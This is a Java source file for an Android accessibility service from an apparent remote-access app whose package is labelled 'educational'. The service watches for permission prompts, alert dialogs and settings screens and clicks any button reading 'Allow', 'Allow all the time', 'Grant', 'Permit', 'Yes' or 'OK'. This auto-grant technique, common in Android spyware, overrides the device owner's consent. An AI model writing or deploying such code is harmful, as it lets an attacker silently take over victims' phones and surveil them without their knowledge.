package com.remoteaccess.educational.permissions;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

public class AutoClickPermissionService extends AccessibilityService {

    private static AutoClickPermissionService instance;

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED | 
                         AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        info.notificationTimeout = 100;
        
        setServiceInfo(info);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Check if it's a permission dialog
        String className = event.getClassName().toString();
        
        if (className.contains("Permission") || 
            className.contains("GrantPermissions") ||
            className.contains("AlertDialog") ||
            className.contains("Com.android.settings")) {
            
            // Try to find and click Allow button
            clickAllowButton();
        }
    }

    private void clickAllowButton() {
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null) return;

        // Find button with text "Allow" or "Allow all the time"
        if (findAndClickButton(rootNode, "Allow")) return;
        if (findAndClickButton(rootNode, "ALLOW")) return;
        if (findAndClickButton(rootNode, "Allow all the time")) return;
        if (findAndClickButton(rootNode, "Permit")) return;
        if (findAndClickButton(rootNode, "Grant")) return;
        if (findAndClickButton(rootNode, "Yes")) return;
        if (findAndClickButton(rootNode, "OK")) return;
        
        rootNode.recycle();
    }

    private boolean findAndClickButton(AccessibilityNodeInfo node, String text) {
        if (node == null) return false;

        // Check if this node is a button with the text
        if (node.isClickable() && node.getText() != null) {
            String nodeText = node.getText().toString();
            if (nodeText.contains(text)) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                return true;
            }
        }

        // Check children
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                if (findAndClickButton(child, text)) {
                    child.recycle();
                    return true;
                }
                child.recycle();
            }
        }

        return false;
    }

    @Override
    public void onInterrupt() {
        // Service interrupted
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        instance = null;
    }

    public static boolean isRunning() {
        return instance != null;
    }

    public static void triggerAutoClick() {
        if (instance != null) {
            instance.clickAllowButton();
        }
    }
}
